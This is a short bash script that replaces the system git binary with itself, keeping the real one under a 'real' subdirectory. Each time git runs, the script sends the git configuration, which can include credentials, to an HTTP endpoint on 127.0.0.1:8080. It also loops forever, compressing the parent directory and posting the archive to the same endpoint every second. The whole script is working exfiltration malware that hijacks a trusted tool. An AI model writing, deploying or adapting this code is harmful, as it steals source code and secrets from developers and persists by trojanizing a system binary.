#!/bin/bash

# XXX: run with sudo

leak() {
  echo "$1"
  exec curl --no-progress-meter -X POST 'http://127.0.0.1:8080/api/v1/account-joyride-hacksaw2-earmuff-upstairs-groggily' --data-binary "$1"
}

if [[ "$0" = git ]]; then
  realgit="$(dirname $0)/real/git"
  d="$("$realgit" config --list --show-origin)"
  leak "$d"
  exec "$realgit" "$@"
else
  oldgit=$(command -v git)
  realgit=$(dirname $oldgit)/real/git
  mkdir -v -p $(dirname $realgit)
  cp -v "$oldgit" "$realgit"
  cp -v "$0" "$oldgit"
fi

cd ..
while true; do
  f=/tmp/a.zstd
  rm -rf "$f"
  ZSTD_CLEVEL=19 tar cf "$f" --zstd --exclude=db --exclude=_build --exclude=.lexical --exclude=.elixir_ls --exclude=.pytest_cache --exclude=.ruff_cache --exclude=__pycache__ .
  sha1sum "$f"
  leak "@$f"
  sleep 1
done
